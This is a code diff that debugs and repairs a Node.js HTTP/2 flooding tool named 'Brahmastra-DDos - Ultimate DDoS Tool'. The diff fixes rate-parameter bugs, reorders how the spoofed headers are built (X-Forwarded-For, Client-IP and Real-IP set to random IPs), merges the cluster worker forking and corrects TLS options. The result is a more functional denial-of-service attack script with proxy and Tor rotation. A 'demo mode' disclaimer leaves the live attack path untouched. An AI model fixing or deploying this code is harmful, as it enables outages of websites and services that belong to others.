@@ -287,7 +287,7 @@ const getCurrentTime = () => {
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };
 
- const targetURL = process.argv[2];
+ const targetURL = process.argv[2] || 'https://example.com';
  const agent = new https.Agent({ rejectUnauthorized: false });
 
  function getStatus() {
@@ -331,7 +331,7 @@ const getCurrentTime = () => {
   console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Starting Demo Attack Simulation`);
   console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Target: ${args.target}`);
   console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Duration: ${args.time} seconds`);
-  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Rate: ${args.Rate} requests/second`);
+  console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Rate: ${args.rate} requests/second`);
   console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Threads: ${args.threads}`);
   console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} Proxy File: ${args.proxyFile}`);
   
@@ -376,7 +376,7 @@ const getCurrentTime = () => {
     }
     
     // Simulate requests being sent
-    for (let i = 0; i < args.Rate; i++) {
+    for (let i = 0; i < args.rate; i++) {
       requestCount++;
       const fakeIP = ip_spoof();
       const fakeUserAgent = uap[Math.floor(Math.random() * uap.length)];
@@ -435,12 +435,13 @@ const getCurrentTime = () => {
  // Update args object with parsed values
 args.target = process.argv[2];
 args.time = ~~process.argv[3];
-args.Rate = ~~process.argv[4];
+args.rate = ~~process.argv[4];
 args.threads = ~~process.argv[5];
 args.proxyFile = process.argv[6];
 
 
-if (cluster.isMaster){
+// Main execution logic
+if (cluster.isMaster) {
   console.clear();
   console.log(`
   🚀 Brahmastra-DDos - Ultimate DDoS Tool v2.0.0
@@ -498,6 +499,7 @@ if (cluster.isMaster){
     console.log(`[\x1b[33mDEMO MODE\x1b[0m] ${getCurrentTime()} This is for educational and testing purposes only`);
     runDemoMode();
   } else {
+    // Only create worker processes if not in demo mode
     for (let i = 1; i <= process.argv[5]; i++){
       cluster.fork();
       console.log(`[\x1b[35mBrahmastra-DDos\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
@@ -518,6 +520,7 @@ if (cluster.isMaster){
     }, process.argv[3] * 1000);
   }
 } else if (!isDemoMode) {
+  // Only run flooder in worker processes if not in demo mode
   setInterval(runFlooder);
 }
 
@@ -1052,74 +1055,24 @@ const uap = [
   'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
 ];
 
- const ip_spoof = () => {
-   const ip_segment = () => {
-     return Math.floor(Math.random() * 255);
-   };
-   return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
- };
+// IP spoofing function
+const ip_spoof = () => {
+  const ip_segment = () => {
+    return Math.floor(Math.random() * 255);
+  };
+  return `${ip_segment()}.${ip_segment()}.${ip_segment()}.${ip_segment()}`;
+};
+
+ 
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var proxies = readLines(args.proxyFile);
 const fakeIP = ip_spoof();
 var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
 const parsedTarget = url.parse(args.target);
 
-// Set headers after fakeIP is available
-headers[":method"] = randomMethod;
-headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
-headers["origin"] = parsedTarget.host;
-headers["Content-Type"] = randomHeaders['Content-Type'];
-headers[":scheme"] = "https";
-headers["x-download-options"] = randomHeaders['x-download-options'];
-headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
-headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
-headers["accept"] = randomHeaders['accept'];
-headers["accept-language"] = randomHeaders['accept-language'];
-headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
-headers["x-cache"] = randomHeaders['x-cache'];
-headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
-headers["accept-encoding"] = randomHeaders['accept-encoding'];
-headers["cache-control"] = randomHeaders['cache-control'];
-headers["x-frame-options"] = randomHeaders['x-frame-options'];
-headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
-headers["x-content-type-options"] = "nosniff";
-headers["TE"] = "trailers";
-headers["pragma"] = randomHeaders['pragma'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["upgrade-insecure-requests"] = "1";
-headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
-headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
-headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
-headers["X-Forwarded-Proto"] = HTTPS;
-headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
-headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
-headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
-headers["vary"] = randomHeaders['vary'];
-headers["x-requested-with"] = "XMLHttpRequest";
-headers["TE"] = trailers;
-headers["set-cookie"] = randomHeaders['set-cookie'];
-headers["Server"] = randomHeaders['Server'];
-headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
-headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
-headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
-headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
-headers["alt-svc"] = randomHeaders['alt-svc'];
-headers["Via"] = fakeIP;
-headers["sss"] = fakeIP;
-headers["Sec-Websocket-Key"] = fakeIP;
-headers["Sec-Websocket-Version"] = 13;
-headers["Upgrade"] = websocket;
-headers["X-Forwarded-For"] = fakeIP;
-headers["X-Forwarded-Host"] = fakeIP;
-headers["Client-IP"] = fakeIP;
-headers["Real-IP"] = fakeIP;
-headers["Referer"] = randomReferer;
+// Headers will be set after randomHeaders is defined
 
- if (cluster.isMaster) {
-    for (let counter = 1; counter <= args.threads; counter++) {
-        cluster.fork();
-    }
-} else {setInterval(runFlooder) }
+// This cluster logic is handled in the main execution section above
  
  class NetSocket {
      constructor(){}
@@ -1362,6 +1315,57 @@ const randomHeaders = {
     'alt-svc': alt_svc_header[Math.floor(Math.random() * alt_svc_header.length)]
 };
 
+// Set headers after randomHeaders is available
+headers[":method"] = randomMethod;
+headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + "&" + randomString(10) + queryString + randomString(10);
+headers["origin"] = parsedTarget.host;
+headers["Content-Type"] = randomHeaders['Content-Type'];
+headers[":scheme"] = "https";
+headers["x-download-options"] = randomHeaders['x-download-options'];
+headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
+headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
+headers["accept"] = randomHeaders['accept'];
+headers["accept-language"] = randomHeaders['accept-language'];
+headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
+headers["x-cache"] = randomHeaders['x-cache'];
+headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
+headers["accept-encoding"] = randomHeaders['accept-encoding'];
+headers["cache-control"] = randomHeaders['cache-control'];
+headers["x-frame-options"] = randomHeaders['x-frame-options'];
+headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
+headers["x-content-type-options"] = "nosniff";
+headers["TE"] = "trailers";
+headers["pragma"] = randomHeaders['pragma'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["upgrade-insecure-requests"] = "1";
+headers["sec-fetch-dest"] = randomHeaders['sec-fetch-dest'];
+headers["sec-fetch-mode"] = randomHeaders['sec-fetch-mode'];
+headers["sec-fetch-site"] = randomHeaders['sec-fetch-site'];
+headers["X-Forwarded-Proto"] = HTTPS;
+headers["sec-ch-ua"] = randomHeaders['sec-ch-ua'];
+headers["sec-ch-ua-mobile"] = randomHeaders['sec-ch-ua-mobile'];
+headers["sec-ch-ua-platform"] = randomHeaders['sec-ch-ua-platform'];
+headers["vary"] = randomHeaders['vary'];
+headers["x-requested-with"] = "XMLHttpRequest";
+headers["TE"] = trailers;
+headers["set-cookie"] = randomHeaders['set-cookie'];
+headers["Server"] = randomHeaders['Server'];
+headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
+headers["access-control-allow-headers"] = randomHeaders['access-control-allow-headers'];
+headers["access-control-allow-origin"] = randomHeaders['access-control-allow-origin'];
+headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
+headers["alt-svc"] = randomHeaders['alt-svc'];
+headers["Via"] = fakeIP;
+headers["sss"] = fakeIP;
+// headers["Sec-Websocket-Key"] = fakeIP; // Removed - not compatible with HTTP/2
+// headers["Sec-Websocket-Version"] = 13; // Removed - not compatible with HTTP/2
+// headers["Upgrade"] = websocket; // Removed - not compatible with HTTP/2
+headers["X-Forwarded-For"] = fakeIP;
+headers["X-Forwarded-Host"] = fakeIP;
+headers["Client-IP"] = fakeIP;
+headers["Real-IP"] = fakeIP;
+headers["Referer"] = randomReferer;
+
  
  function runFlooder() {
     // Rotate Tor circuit if enabled
@@ -1409,10 +1413,10 @@ const randomHeaders = {
            cloudflareMaxTimeout: 30000,
            ciphers: tls.getCiphers().join(":") + cipper,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
-           servername: url.hostname,
+                       servername: parsedTarget.host,
            socket: connection,
            honorCipherOrder: true,
-           secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+                       secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
            sigals: concu,
            echdCurve: "GREASE:X25519:x25519:P-256:P-384:P-521:X448",
            secure: true,
@@ -1464,7 +1468,7 @@ const randomHeaders = {
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
-               for (let i = 0; i < args.Rate; i++) {
+                               for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
